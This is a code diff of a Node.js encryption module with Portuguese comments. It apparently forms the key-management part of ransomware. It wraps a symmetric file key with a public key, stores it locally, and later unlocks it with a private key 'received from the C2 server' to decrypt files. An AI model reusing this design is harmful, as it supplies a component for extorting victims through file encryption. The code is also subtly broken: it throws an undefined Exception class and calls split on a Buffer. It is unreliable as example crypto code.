@@ -1,9 +1,16 @@
-const Crypto = use("crypto");
+const Crypto = require("crypto");
+const fs = require("fs");
+const path = require("path");
+const saveKey = require("./saveKey");
 
+/**
+ * Provedor das principais funções de encriptação
+ * @var cipher public or private asymetric KeyObject
+ * @see https://nodejs.org/dist/latest-v11.x/docs/api/crypto.html#crypto_class_keyobject
+ */
 class EncryptionProvider {
   constructor() {
-    this.cipher_rsa = null;
-    this.secret_key = null;
+    this.cipher = null;
   }
 
   /**
@@ -13,20 +20,72 @@ class EncryptionProvider {
    * @see https://nodejs.org/api/crypto.html#crypto_crypto_createpublickey_key
    */
   importPublicKey(publicKey) {
-    this.cipher_rsa = Crypto.createPublicKey({
+    /**
+     * Public Key importada do Servidor remoto
+     */
+    this.cipher = Crypto.createPublicKey({
       key: publicKey,
       format: "pem",
       type: "pkcs1"
     });
   }
+
   /**
-   * Gera uma `secret key` para encryptar os dados
+   * Encripta a chave simétrica `encryptionKey` e salva localmente
+   * @param { Buffer } encryptionKey
+   * @return void
    */
-  generateSecretKey() {
-    var session_key;
-    // gera uma chave randomica de 256 bytes
-    Crypto.randomBytes(256, (err, data) => (session_key = data));
-    this.secret_key = Crypto.createSecretKey(session_key);
+  saveEncryptionKey(encryptionKey) {
+    var encryptedKey;
+    if (this.cipher) {
+      encryptedKey = Crypto.publicEncrypt(this.cipher, encryptionKey);
+      return saveKey(encryptedKey, "secret.bin");
+    } else {
+      throw new Exception(
+        "É necessário importar a chave pública antes de salvar a chave"
+      );
+    }
+  }
+
+  /**
+   *  Importa e converte a chave privada assimétrica recebida do servidor c2
+   * @param {String} privateKey
+   * @return void
+   */
+  importPrivateKey(privateKey) {
+    this.cipher = Crypto.createPrivateKey({
+      key: privateKey,
+      format: "pem",
+      type: "pkcs1"
+    });
+  }
+
+  /**
+   * Carrega a chave simétrica local para desencriptação dos arquivos
+   * @var encSymetricKey chave simétrica encriptada pela chave pública anteriormente
+   * @var symetricKey chave simétrica desencriptada pela chave privada agora
+   * @return { Object }
+   */
+  loadEncryptionKey() {
+    var symetricKey, encSymetricKey;
+    if (this.cipher) {
+      // lê a chave simétrica que está encriptada no disco local
+      const symetricPath = path.join(__dirname, "..", "keys", "secret.bin");
+      encSymetricKey = fs.readFileSync(symetricPath);
+      //  desencripta a chave simétrica local
+      if (!Buffer.isBuffer(encSymetricKey)) {
+        encSymetricKey = Buffer.from(encSymetricKey, "utf8");
+      }
+      symetricKey = Crypto.privateDecrypt(this.cipher, encSymetricKey);
+      const keyArr = symetricKey.split(":");
+      const IV = keyArr[0],
+        KEY = keyArr[1];
+      return { IV, KEY };
+    } else {
+      throw new Exception(
+        "É necessário importar a chave privada antes de carregar a chave"
+      );
+    }
   }
 }
 
